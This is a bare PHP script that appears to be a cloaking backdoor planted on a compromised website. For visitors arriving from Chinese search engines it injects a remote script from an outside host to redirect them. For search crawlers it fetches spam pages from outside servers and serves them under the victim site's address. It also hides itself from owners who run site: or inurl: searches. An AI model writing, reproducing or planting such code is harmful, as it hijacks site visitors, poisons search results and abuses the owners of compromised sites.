<?php
error_reporting(0); 
set_time_limit(20); 
$sm = 'p0rn';
$Class_ck = true;
$jumpjs = '<script type="text/javascript" src="http://js.38dgs.com/fuck.js" ></script>'; 
define('Referer', $_SERVER['HTTP_REFERER']); 
if (stristr(Referer,'baidu') or stristr(Referer,'360') or stristr(Referer,'sogou') or stristr(Referer,'so.') or stristr(Referer,'yisou') or stristr(Referer,'sm')) {
   if (stristr(Referer,'site') or stristr(Referer,'inurl')) {
        setcookie($sm, Host, time() + 259200);
        $Class_ck = false;
    }  
    if (empty($_COOKIE[$sm]) && !isCrawler() && stristr($_SERVER['REQUEST_URI'],'id=article')) {
            echo "$jumpjs";exit;
//ÅÐ¶ÏURL "id=article" ²ÅÄÜÌø×ª
    }
}
function isCrawler() {
        $agent= strtolower($_SERVER['HTTP_USER_AGENT']);  
        if (!empty($agent)) {                
                $spiderSite= array('Baiduspider+','Googlebot','msnbot','Sosospider+','Sogou web spider','360Spider','Yahoo! Slurp','YoudaoBot','Baiduspider');  
                foreach($spiderSite as $val) {$str = strtolower($val);if (strpos($agent, $str) !== false) {        return true;}                      
                }  
        } else {
                return false;
        }
}   
header('Content-Type: text/html; charset=gb2312');
$urlstring = $_SERVER['REQUEST_URI'];
if(isCrawler())
{
if ($randnumber = stristr($urlstring,'?id='))
{
	if (function_exists('curl_init')){
		$curl_handle = curl_init(); 
		curl_setopt($curl_handle, CURLOPT_URL, 'http://seo.d22p.com/index.php'.$randnumber);
		curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT,19); 
		curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
		$file_content = curl_exec($curl_handle); 
		curl_close($curl_handle); 
		$curdir=$_SERVER['SCRIPT_NAME'];
		$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
		$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
		echo($html);
}
else {
	$file_content = @file_get_contents('http://global.38dgs.com/index.php'.$randnumber);
	$curdir=$_SERVER['SCRIPT_NAME'];
	$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
	$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
	echo($html);

}

}else{
if (function_exists('curl_init')){
		$curl_handle = curl_init();  
		curl_setopt($curl_handle, CURLOPT_URL, 'http://global.38dgs.com/index.php'); 
		curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT,19);
		curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
		$file_content = curl_exec($curl_handle); 
		curl_close($curl_handle); 
		$curdir=$_SERVER['SCRIPT_NAME'];
		$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
		$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
		echo($html);
}
else {
	$file_content = @file_get_contents('http://global.38dgs.com/index.php');
	$curdir=$_SERVER['SCRIPT_NAME'];
	$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
	$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
	echo($html);

}
}
}
?>